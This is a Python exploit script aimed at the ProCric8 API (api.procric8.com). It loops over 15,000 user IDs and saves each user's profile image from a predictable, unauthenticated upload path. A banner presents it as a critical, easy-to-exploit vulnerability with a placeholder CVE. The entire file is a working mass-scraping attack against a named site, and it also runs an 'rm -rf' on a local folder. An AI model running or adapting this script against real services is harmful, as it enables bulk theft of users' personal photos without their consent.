#! /usr/bin/python3

import os
import requests
import time

try:
    #Checking site availability
    response = requests.get("http://api.procric8.com/")
    
    #Author Banner
    print()
    print("="*90)
    print("Vulnerability - Unauthenticated ProCric8 Mass User image download")
    print("Exploit Author - Akash Pandey a.k.a l3v1ath0n\nCVE - CVE-2024-????\nVersion - N/A\nExploitability - Easy\nSeverity - Critical")
    print("="*90)
    print()

    #Creating Directory to store images
    print("[+] Creating Images Directory")
    time.sleep(0.3)
    os.system("rm -rf ./Images;mkdir ./Images")
    os.chdir("./Images")

    #Checking Site accessibility
    if response.status_code == 403:
        print("[*] Checking site accessibility.")
        time.sleep(0.5)
        print("[+] Site is accessible.")
        time.sleep(0.5)
        print("[+] Trying to download user images.")
        for image in range(0,15000):
            str_img=str(image)
            #print("[+] Trying to download user images.")
            response = requests.get("http://api.procric8.com/assets/uploads/files/users/"+str_img+".jpg")
            if response.status_code == 200:
                print("[+] Downloading and Saving user profile image - "+str_img)
                with open(str_img+".jpg","wb") as file:
                    file.write(response.content)
                    time.sleep(0.1)
                    file.close()
            elif response.status_code == 404:
                print("[-] No Image to download for user - "+str_img)
            else:
                print("[!]Error while downloading image - "+str_img)
    else:
        print("[!] Site is inaccessible")

except:
    print("[!] Error while exploiting the vulnerability!")
